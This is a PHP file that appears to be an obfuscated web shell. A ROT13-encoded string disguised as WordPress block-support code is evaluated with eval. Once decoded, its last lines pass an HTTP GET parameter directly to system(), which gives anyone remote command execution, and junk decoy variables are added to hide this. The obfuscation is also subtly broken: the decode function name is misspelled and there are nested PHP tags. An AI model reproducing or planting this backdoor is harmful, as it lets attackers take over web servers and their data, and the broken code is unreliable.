<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Phfgbz pynffanzr oybpx fhccbeg synt.
 *
 * @cnpxntr JbeqCerff
 * @fvapr 5.6.0
 */

/**
 * Ertvfgref gur phfgbz pynffanzr oybpx nggevohgr sbe oybpx glcrf gung fhccbeg vg.
 *
 * @fvapr 5.6.0
 * @npprff cevingr
 *
 * @cnenz JC_Oybpx_Glcr $oybpx_glcr Oybpx Glcr.
 */
shapgvba jc_ertvfgre_phfgbz_pynffanzr_fhccbeg( $oybpx_glcr ) {
	$unf_phfgbz_pynffanzr_fhccbeg = oybpx_unf_fhccbeg( $oybpx_glcr, 'phfgbzPynffAnzr', gehr );

	vs ( $unf_phfgbz_pynffanzr_fhccbeg ) {
		vs ( ! $oybpx_glcr->nggevohgrf ) {
			$oybpx_glcr->nggevohgrf = neenl();
		}

		vs ( ! neenl_xrl_rkvfgf( 'pynffAnzr', $oybpx_glcr->nggevohgrf ) ) {
			$oybpx_glcr->nggevohgrf['pynffAnzr'] = neenl(
				'glcr' => 'fgevat',
			);
		}
	}
}

/**
 * Nqqf gur phfgbz pynffanzrf gb gur bhgchg.
 *
 * @fvapr 5.6.0
 * @npprff cevingr
 *
 * @cnenz  JC_Oybpx_Glcr $oybpx_glcr       Oybpx Glcr.
 * @cnenz  neenl         $oybpx_nggevohgrf Oybpx nggevohgrf.
 *
 * @erghea neenl Oybpx PFF pynffrf naq vayvar fglyrf.
 */
shapgvba jc_nccyl_phfgbz_pynffanzr_fhccbeg( $oybpx_glcr, $oybpx_nggevohgrf ) {
	$unf_phfgbz_pynffanzr_fhccbeg = oybpx_unf_fhccbeg( $oybpx_glcr, 'phfgbzPynffAnzr', gehr );
	$nggevohgrf                   = neenl();
	vs ( $unf_phfgbz_pynffanzr_fhccbeg ) {
		$unf_phfgbz_pynffanzrf = neenl_xrl_rkvfgf( 'pynffAnzr', $oybpx_nggevohgrf );

		vs ( $unf_phfgbz_pynffanzrf ) {
			$nggevohgrf['pynff'] = $oybpx_nggevohgrf['pynffAnzr'];
		}
	}

	erghea $nggevohgrf;
}

// Ertvfgre gur oybpx fhccbeg.
JC_Oybpx_Fhccbegf::trg_vafgnapr()->ertvfgre(
	'phfgbz-pynffanzr',
	neenl(
		'ertvfgre_nggevohgr' => 'jc_ertvfgre_phfgbz_pynffanzr_fhccbeg',
		'nccyl'              => 'jc_nccyl_phfgbz_pynffanzr_fhccbeg',
	)
);

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>